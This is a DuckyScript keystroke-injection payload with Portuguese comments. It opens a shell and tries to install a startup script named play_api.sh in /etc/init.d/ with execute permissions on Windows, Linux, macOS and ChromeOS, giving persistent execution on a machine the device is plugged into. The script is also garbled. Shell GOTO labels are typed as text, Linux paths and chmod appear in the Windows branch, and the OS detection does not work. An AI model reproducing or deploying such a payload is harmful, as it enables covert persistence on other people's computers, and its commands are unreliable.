REM Verificar o sistema operacional atual
REM Adaptar os comandos com base no sistema operacional
DELAY 500
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING ver | findstr /i "Windows" >nul && GOTO windows
STRING uname -a | grep -i "linux" > /dev/null && GOTO linux
STRING sw_vers | grep -i "mac" > /dev/null && GOTO mac
STRING chromeos
ENTER
DELAY 500
REM Inserir comandos específicos para cada sistema operacional
REM Comandos para Windows
:windows
STRING start explorer
ENTER
DELAY 1000
REM Navegar até a pasta "/etc/init.d/"
STRING cd /etc/init.d/
ENTER
DELAY 1000
REM Mover o script de inicialização
STRING move play_api.sh /etc/init.d/
ENTER
DELAY 1000
REM Dar permissões de execução ao script
STRING chmod +x /etc/init.d/play_api.sh
ENTER
DELAY 1000
REM Comandos para Linux
:linux
STRING nautilus
ENTER
DELAY 1000
REM Navegar até a pasta "/etc/init.d/"
STRING cd /etc/init.d/
ENTER
DELAY 1000
REM Mover o script de inicialização
STRING mv play_api.sh /etc/init.d/
ENTER
DELAY 1000
REM Dar permissões de execução ao script
STRING chmod +x /etc/init.d/play_api.sh
ENTER
DELAY 1000
REM Comandos para macOS
:mac
STRING open /System/Library/CoreServices/Finder.app
ENTER
DELAY 1000
REM Navegar até a pasta "/etc/init.d/"
STRING cd /etc/init.d/
ENTER
DELAY 1000
REM Mover o script de inicialização
STRING mv play_api.sh /etc/init.d/
ENTER
DELAY 1000
REM Dar permissões de execução ao script
STRING chmod +x /etc/init.d/play_api.sh
ENTER
DELAY 1000
REM Comandos para Chrome OS (Chromebook)
:chromeos
STRING crosh
ENTER
DELAY 500
STRING shell
ENTER
DELAY 500
REM Navegar até a pasta "/etc/init.d/"
STRING cd /etc/init.d/
ENTER
DELAY 1000
REM Mover o script de inicialização
STRING mv play_api.sh /etc/init.d/
ENTER
DELAY 1000
REM Dar permissões de execução ao script
STRING chmod +x /etc/init.d/play_api.sh
ENTER
DELAY 1000